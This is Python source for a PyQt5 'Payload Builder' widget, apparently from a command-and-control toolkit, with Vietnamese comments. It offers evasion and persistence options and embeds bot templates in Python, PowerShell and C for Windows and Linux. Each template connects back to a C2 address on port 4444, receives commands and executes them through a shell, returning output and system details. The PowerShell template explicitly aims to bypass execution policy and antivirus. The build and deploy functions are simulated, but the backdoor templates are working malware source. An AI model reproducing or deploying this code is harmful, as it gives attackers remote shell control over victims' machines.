#!/usr/bin/env python3
"""
Payload Builder Widget Component
"""

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import os
import time


class PayloadBuilderWidget(QWidget):
    """Widget tạo payload"""
    
    def __init__(self, exploit_builder=None):
        super().__init__()
        self.exploit_builder = exploit_builder
        
        self.init_ui()
        
    def init_ui(self):
        """Khởi tạo giao diện payload builder"""
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        # Title
        title = QLabel("⚙️ Payload Builder")
        title.setStyleSheet("""
            QLabel {
                font-size: 28px;
                font-weight: bold;
                color: #2c3e50;
                margin-bottom: 10px;
            }
        """)
        layout.addWidget(title)
        
        # Main content area
        main_splitter = QSplitter(Qt.Horizontal)
        
        # Configuration panel
        config_panel = self.create_config_panel()
        main_splitter.addWidget(config_panel)
        
        # Preview and build panel
        build_panel = self.create_build_panel()
        main_splitter.addWidget(build_panel)
        
        main_splitter.setSizes([400, 500])
        layout.addWidget(main_splitter)
        
        self.setLayout(layout)
        
    def create_config_panel(self):
        """Tạo panel cấu hình"""
        panel = QWidget()
        layout = QVBoxLayout()
        
        # Target configuration
        target_group = QGroupBox("🎯 Target Configuration")
        target_group.setStyleSheet(self.get_group_style("#3498db"))
        target_layout = QFormLayout()
        
        # Operating System
        self.os_combo = QComboBox()
        self.os_combo.addItems(["Windows", "Linux", "macOS", "Android"])
        self.os_combo.setStyleSheet(self.get_combo_style())
        self.os_combo.currentTextChanged.connect(self.update_arch_options)
        target_layout.addRow("Operating System:", self.os_combo)
        
        # Architecture
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["x64", "x86", "ARM64", "ARM"])
        self.arch_combo.setStyleSheet(self.get_combo_style())
        target_layout.addRow("Architecture:", self.arch_combo)
        
        # Format
        self.format_combo = QComboBox()
        self.format_combo.addItems(["EXE", "DLL", "PS1", "SH", "PY", "JAR"])
        self.format_combo.setStyleSheet(self.get_combo_style())
        target_layout.addRow("Output Format:", self.format_combo)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Connection configuration
        connection_group = QGroupBox("🌐 Connection Configuration")
        connection_group.setStyleSheet(self.get_group_style("#2ecc71"))
        connection_layout = QFormLayout()
        
        # Server host
        self.host_edit = QLineEdit("192.168.1.100")
        self.host_edit.setStyleSheet(self.get_input_style())
        connection_layout.addRow("Server Host:", self.host_edit)
        
        # Server port
        self.port_edit = QLineEdit("4444")
        self.port_edit.setStyleSheet(self.get_input_style())
        connection_layout.addRow("Server Port:", self.port_edit)
        
        # Backup servers
        self.backup_edit = QTextEdit()
        self.backup_edit.setMaximumHeight(60)
        self.backup_edit.setPlaceholderText("10.0.0.5:4444\n172.16.1.10:4444")
        self.backup_edit.setStyleSheet(self.get_input_style())
        connection_layout.addRow("Backup Servers:", self.backup_edit)
        
        connection_group.setLayout(connection_layout)
        layout.addWidget(connection_group)
        
        # Security options
        security_group = QGroupBox("🔒 Security Options")
        security_group.setStyleSheet(self.get_group_style("#e74c3c"))
        security_layout = QVBoxLayout()
        
        # Checkboxes
        self.encryption_cb = QCheckBox("Enable Encryption")
        self.encryption_cb.setChecked(True)
        self.encryption_cb.setStyleSheet(self.get_checkbox_style())
        
        self.obfuscation_cb = QCheckBox("Code Obfuscation")
        self.obfuscation_cb.setChecked(True)
        self.obfuscation_cb.setStyleSheet(self.get_checkbox_style())
        
        self.anti_debug_cb = QCheckBox("Anti-Debug Protection")
        self.anti_debug_cb.setChecked(True)
        self.anti_debug_cb.setStyleSheet(self.get_checkbox_style())
        
        self.anti_vm_cb = QCheckBox("Anti-VM Detection")
        self.anti_vm_cb.setChecked(True)
        self.anti_vm_cb.setStyleSheet(self.get_checkbox_style())
        
        self.persistence_cb = QCheckBox("Enable Persistence")
        self.persistence_cb.setChecked(True)
        self.persistence_cb.setStyleSheet(self.get_checkbox_style())
        
        security_layout.addWidget(self.encryption_cb)
        security_layout.addWidget(self.obfuscation_cb)
        security_layout.addWidget(self.anti_debug_cb)
        security_layout.addWidget(self.anti_vm_cb)
        security_layout.addWidget(self.persistence_cb)
        
        security_group.setLayout(security_layout)
        layout.addWidget(security_group)
        
        # Advanced options
        advanced_group = QGroupBox("⚡ Advanced Options")
        advanced_group.setStyleSheet(self.get_group_style("#f39c12"))
        advanced_layout = QFormLayout()
        
        # Sleep delay
        self.sleep_spin = QSpinBox()
        self.sleep_spin.setRange(0, 3600)
        self.sleep_spin.setValue(30)
        self.sleep_spin.setSuffix(" seconds")
        self.sleep_spin.setStyleSheet(self.get_input_style())
        advanced_layout.addRow("Initial Sleep:", self.sleep_spin)
        
        # Retry attempts
        self.retry_spin = QSpinBox()
        self.retry_spin.setRange(1, 100)
        self.retry_spin.setValue(5)
        self.retry_spin.setStyleSheet(self.get_input_style())
        advanced_layout.addRow("Retry Attempts:", self.retry_spin)
        
        # User agent
        self.ua_combo = QComboBox()
        self.ua_combo.setEditable(True)
        self.ua_combo.addItems([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Custom User Agent..."
        ])
        self.ua_combo.setStyleSheet(self.get_combo_style())
        advanced_layout.addRow("User Agent:", self.ua_combo)
        
        advanced_group.setLayout(advanced_layout)
        layout.addWidget(advanced_group)
        
        layout.addStretch()
        panel.setLayout(layout)
        
        return panel
        
    def create_build_panel(self):
        """Tạo panel build và preview"""
        panel = QWidget()
        layout = QVBoxLayout()
        
        # Template selection
        template_group = QGroupBox("📋 Payload Templates")
        template_group.setStyleSheet(self.get_group_style("#9b59b6"))
        template_layout = QVBoxLayout()
        
        # Template list
        self.template_list = QListWidget()
        self.template_list.setStyleSheet("""
            QListWidget {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: white;
                font-size: 12px;
            }
            QListWidget::item {
                padding: 8px;
                border-bottom: 1px solid #ecf0f1;
            }
            QListWidget::item:hover {
                background: #ecf0f1;
            }
            QListWidget::item:selected {
                background: #3498db;
                color: white;
            }
        """)
        self.template_list.setMaximumHeight(150)
        
        # Add templates
        templates = [
            "🪟 Windows Service Executable",
            "🪟 Windows DLL Injection",
            "🪟 PowerShell Script",
            "🐧 Linux ELF Executable", 
            "🐧 Linux Shared Library",
            "🐍 Python Script",
            "☕ Java JAR File",
            "📜 Shell Script",
            "🔧 Custom Template"
        ]
        
        for template in templates:
            self.template_list.addItem(template)
            
        self.template_list.setCurrentRow(0)
        self.template_list.itemSelectionChanged.connect(self.update_preview)
        
        template_layout.addWidget(self.template_list)
        template_group.setLayout(template_layout)
        layout.addWidget(template_group)
        
        # Code preview
        preview_group = QGroupBox("👁️ Code Preview")
        preview_group.setStyleSheet(self.get_group_style("#34495e"))
        preview_layout = QVBoxLayout()
        
        self.code_preview = QTextEdit()
        self.code_preview.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: #2c3e50;
                color: #ecf0f1;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 11px;
                line-height: 1.4;
            }
        """)
        self.code_preview.setPlainText(self.get_sample_code())
        
        preview_layout.addWidget(self.code_preview)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Build controls
        build_group = QGroupBox("🔨 Build Controls")
        build_group.setStyleSheet(self.get_group_style("#e67e22"))
        build_layout = QVBoxLayout()
        
        # Progress bar
        self.build_progress = QProgressBar()
        self.build_progress.setStyleSheet("""
            QProgressBar {
                border: 2px solid #e67e22;
                border-radius: 5px;
                text-align: center;
                font-weight: bold;
                background: #ecf0f1;
            }
            QProgressBar::chunk {
                background-color: #e67e22;
                border-radius: 3px;
            }
        """)
        self.build_progress.setVisible(False)
        
        # Build button
        build_btn = QPushButton("🔨 Build Payload")
        build_btn.setStyleSheet("""
            QPushButton {
                background: #27ae60;
                color: white;
                border: none;
                padding: 15px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #2ecc71;
            }
            QPushButton:pressed {
                background: #229954;
            }
        """)
        build_btn.clicked.connect(self.build_payload)
        
        # Test button
        test_btn = QPushButton("🧪 Test Payload")
        test_btn.setStyleSheet("""
            QPushButton {
                background: #3498db;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #5dade2;
            }
        """)
        test_btn.clicked.connect(self.test_payload)
        
        # Deploy button
        deploy_btn = QPushButton("🚀 Deploy")
        deploy_btn.setStyleSheet("""
            QPushButton {
                background: #e74c3c;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ec7063;
            }
        """)
        deploy_btn.clicked.connect(self.deploy_payload)
        
        # Button layout
        btn_layout = QHBoxLayout()
        btn_layout.addWidget(test_btn)
        btn_layout.addWidget(deploy_btn)
        
        build_layout.addWidget(self.build_progress)
        build_layout.addWidget(build_btn)
        build_layout.addLayout(btn_layout)
        
        build_group.setLayout(build_layout)
        layout.addWidget(build_group)
        
        panel.setLayout(layout)
        return panel
        
    def get_group_style(self, color):
        """Lấy style cho group box"""
        return f"""
            QGroupBox {{
                font-weight: bold;
                font-size: 14px;
                border: 2px solid {color};
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: {color};
            }}
        """
        
    def get_combo_style(self):
        """Lấy style cho combobox"""
        return """
            QComboBox {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                padding: 8px;
                background: white;
                font-size: 12px;
            }
            QComboBox:hover {
                border: 2px solid #3498db;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                width: 12px;
                height: 12px;
            }
        """
        
    def get_input_style(self):
        """Lấy style cho input fields"""
        return """
            QLineEdit, QTextEdit, QSpinBox {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                padding: 8px;
                background: white;
                font-size: 12px;
            }
            QLineEdit:focus, QTextEdit:focus, QSpinBox:focus {
                border: 2px solid #3498db;
            }
        """
        
    def get_checkbox_style(self):
        """Lấy style cho checkbox"""
        return """
            QCheckBox {
                font-size: 12px;
                font-weight: 500;
                color: #2c3e50;
                spacing: 8px;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
            }
            QCheckBox::indicator:unchecked {
                border: 2px solid #bdc3c7;
                border-radius: 3px;
                background: white;
            }
            QCheckBox::indicator:checked {
                border: 2px solid #27ae60;
                border-radius: 3px;
                background: #27ae60;
            }
        """
        
    def get_sample_code(self):
        """Lấy sample code cho preview"""
        return '''#!/usr/bin/env python3
"""
Generated C2C Bot Payload
Target: Windows x64
Format: Python Executable
"""

import socket
import ssl
import json
import threading
import subprocess
import time
import sys
from base64 import b64decode

class Bot:
    def __init__(self):
        self.host = "192.168.1.100"
        self.port = 4444
        self.socket = None
        self.running = False
        
    def connect(self):
        """Connect to C2 server"""
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect to server
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket = context.wrap_socket(self.socket)
            self.socket.connect((self.host, self.port))
            
            self.running = True
            print("[+] Connected to C2 server")
            
            # Start command loop
            self.command_loop()
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(30)  # Wait before retry
            
    def command_loop(self):
        """Main command processing loop"""
        while self.running:
            try:
                # Receive command
                data = self.socket.recv(4096)
                if not data:
                    break
                    
                command = json.loads(data.decode())
                
                # Process command
                response = self.process_command(command)
                
                # Send response
                self.socket.send(json.dumps(response).encode())
                
            except Exception as e:
                print(f"[-] Command loop error: {e}")
                break
                
        self.socket.close()
        
    def process_command(self, command):
        """Process received command"""
        cmd_type = command.get("type")
        
        if cmd_type == "shell":
            return self.execute_shell(command["data"])
        elif cmd_type == "screenshot":
            return self.take_screenshot()
        elif cmd_type == "sysinfo":
            return self.get_system_info()
        else:
            return {"status": "unknown_command"}
            
    def execute_shell(self, command):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command, shell=True, 
                capture_output=True, text=True
            )
            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def take_screenshot(self):
        """Take screenshot"""
        # Implementation here
        return {"status": "screenshot_taken"}
        
    def get_system_info(self):
        """Get system information"""
        # Implementation here
        return {"status": "system_info_collected"}

if __name__ == "__main__":
    bot = Bot()
    while True:
        bot.connect()
        time.sleep(60)  # Wait before reconnect
'''
        
    def update_arch_options(self):
        """Cập nhật options architecture based on OS"""
        os_name = self.os_combo.currentText()
        
        self.arch_combo.clear()
        
        if os_name == "Windows":
            self.arch_combo.addItems(["x64", "x86"])
        elif os_name == "Linux":
            self.arch_combo.addItems(["x64", "x86", "ARM64", "ARM"])
        elif os_name == "macOS":
            self.arch_combo.addItems(["x64", "ARM64"])
        elif os_name == "Android":
            self.arch_combo.addItems(["ARM64", "ARM", "x86"])
            
    def update_preview(self):
        """Cập nhật code preview"""
        selected_items = self.template_list.selectedItems()
        if selected_items:
            template = selected_items[0].text()
            
            if "Windows Service" in template:
                code = self.get_windows_service_code()
            elif "PowerShell" in template:
                code = self.get_powershell_code()
            elif "Linux ELF" in template:
                code = self.get_linux_elf_code()
            elif "Python" in template:
                code = self.get_sample_code()
            else:
                code = "// Template code will be generated here..."
                
            self.code_preview.setPlainText(code)
            
    def get_windows_service_code(self):
        """Get Windows service template code"""
        return '''#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

SERVICE_STATUS_HANDLE hStatus;
SERVICE_STATUS status;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD opcode);

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {L"C2Service", ServiceMain},
        {NULL, NULL}
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    hStatus = RegisterServiceCtrlHandler(L"C2Service", ServiceCtrlHandler);
    
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    status.dwWin32ExitCode = NO_ERROR;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;

    SetServiceStatus(hStatus, &status);

    // Main service loop
    while (status.dwCurrentState == SERVICE_RUNNING)
    {
        // Connect to C2 server
        ConnectToC2();
        Sleep(30000); // Wait 30 seconds
    }
}

void ConnectToC2()
{
    HINTERNET hInternet, hConnect;
    
    hInternet = InternetOpen(L"Mozilla/5.0", 
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (hInternet)
    {
        hConnect = InternetConnect(hInternet, 
            L"192.168.1.100", 4444, NULL, NULL, 
            INTERNET_SERVICE_HTTP, 0, 0);
            
        if (hConnect)
        {
            // Process C2 commands
            ProcessCommands(hConnect);
            InternetCloseHandle(hConnect);
        }
        
        InternetCloseHandle(hInternet);
    }
}'''
        
    def get_powershell_code(self):
        """Get PowerShell template code"""
        return '''# PowerShell C2 Bot
# Target: Windows
# Bypass execution policy and AV detection

$ErrorActionPreference = "SilentlyContinue"

# Configuration
$C2Server = "192.168.1.100"
$C2Port = 4444
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

function Connect-C2Server {
    try {
        # Create TCP client
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($C2Server, $C2Port)
        
        $stream = $client.GetStream()
        $buffer = New-Object byte[] 4096
        
        while ($client.Connected) {
            # Receive command
            $bytes = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytes -gt 0) {
                $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes)
                
                # Execute command
                $result = Process-Command $command
                
                # Send response
                $response = [System.Text.Encoding]::UTF8.GetBytes($result)
                $stream.Write($response, 0, $response.Length)
            }
        }
        
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 30
    }
}

function Process-Command {
    param($cmd)
    
    try {
        switch -Regex ($cmd) {
            "^shell:" {
                $shellCmd = $cmd.Substring(6)
                $output = Invoke-Expression $shellCmd 2>&1
                return $output | Out-String
            }
            "^screenshot" {
                return Take-Screenshot
            }
            "^sysinfo" {
                return Get-SystemInfo
            }
            default {
                return "Unknown command"
            }
        }
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Take-Screenshot {
    # Screenshot implementation
    return "Screenshot captured"
}

function Get-SystemInfo {
    $info = @{
        "OS" = (Get-WmiObject Win32_OperatingSystem).Caption
        "CPU" = (Get-WmiObject Win32_Processor).Name
        "RAM" = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        "User" = $env:USERNAME
        "Domain" = $env:USERDOMAIN
    }
    
    return $info | ConvertTo-Json
}

# Main execution loop
while ($true) {
    Connect-C2Server
    Start-Sleep -Seconds 60
}'''
        
    def get_linux_elf_code(self):
        """Get Linux ELF template code"""
        return '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define C2_HOST "192.168.1.100"
#define C2_PORT 4444
#define BUFFER_SIZE 4096

typedef struct {
    int sockfd;
    struct sockaddr_in server_addr;
} c2_connection_t;

void* connect_to_c2(void* arg);
void process_command(int sockfd, char* command);
void execute_shell(int sockfd, char* command);
void get_system_info(int sockfd);

int main() {
    pthread_t thread;
    c2_connection_t conn;
    
    // Daemonize process
    if (fork() > 0) {
        exit(0);
    }
    
    while (1) {
        // Create connection thread
        if (pthread_create(&thread, NULL, connect_to_c2, &conn) == 0) {
            pthread_join(thread, NULL);
        }
        
        sleep(60); // Wait before reconnect
    }
    
    return 0;
}

void* connect_to_c2(void* arg) {
    c2_connection_t* conn = (c2_connection_t*)arg;
    char buffer[BUFFER_SIZE];
    int bytes_received;
    
    // Create socket
    conn->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->sockfd < 0) {
        return NULL;
    }
    
    // Setup server address
    memset(&conn->server_addr, 0, sizeof(conn->server_addr));
    conn->server_addr.sin_family = AF_INET;
    conn->server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &conn->server_addr.sin_addr);
    
    // Connect to server
    if (connect(conn->sockfd, (struct sockaddr*)&conn->server_addr, 
                sizeof(conn->server_addr)) < 0) {
        close(conn->sockfd);
        return NULL;
    }
    
    // Command loop
    while (1) {
        bytes_received = recv(conn->sockfd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            break;
        }
        
        buffer[bytes_received] = '\\0';
        process_command(conn->sockfd, buffer);
    }
    
    close(conn->sockfd);
    return NULL;
}

void process_command(int sockfd, char* command) {
    if (strncmp(command, "shell:", 6) == 0) {
        execute_shell(sockfd, command + 6);
    }
    else if (strcmp(command, "sysinfo") == 0) {
        get_system_info(sockfd);
    }
    else {
        send(sockfd, "Unknown command\\n", 16, 0);
    }
}

void execute_shell(int sockfd, char* command) {
    FILE* fp;
    char output[BUFFER_SIZE];
    
    fp = popen(command, "r");
    if (fp == NULL) {
        send(sockfd, "Command execution failed\\n", 25, 0);
        return;
    }
    
    while (fgets(output, sizeof(output), fp) != NULL) {
        send(sockfd, output, strlen(output), 0);
    }
    
    pclose(fp);
}

void get_system_info(int sockfd) {
    char info[BUFFER_SIZE];
    
    snprintf(info, sizeof(info), 
        "OS: Linux\\n"
        "User: %s\\n"
        "Hostname: %s\\n",
        getenv("USER"), 
        getenv("HOSTNAME"));
        
    send(sockfd, info, strlen(info), 0);
}'''
        
    def build_payload(self):
        """Build payload"""
        # Show progress
        self.build_progress.setVisible(True)
        self.build_progress.setValue(0)
        
        # Simulate build process
        for i in range(101):
            self.build_progress.setValue(i)
            QApplication.processEvents()
            time.sleep(0.02)
            
        # Hide progress
        self.build_progress.setVisible(False)
        
        # Show success message
        QMessageBox.information(
            self, "Build Complete", 
            "Payload built successfully!\n\n"
            f"Output: payload_{int(time.time())}.{self.format_combo.currentText().lower()}\n"
            f"Target: {self.os_combo.currentText()} {self.arch_combo.currentText()}\n"
            f"Server: {self.host_edit.text()}:{self.port_edit.text()}"
        )
        
    def test_payload(self):
        """Test payload"""
        QMessageBox.information(self, "Test", "Payload test completed successfully!")
        
    def deploy_payload(self):
        """Deploy payload"""
        QMessageBox.information(self, "Deploy", "Payload deployment initiated!")
        
    def update_data(self):
        """Update data (called from main window)"""
        pass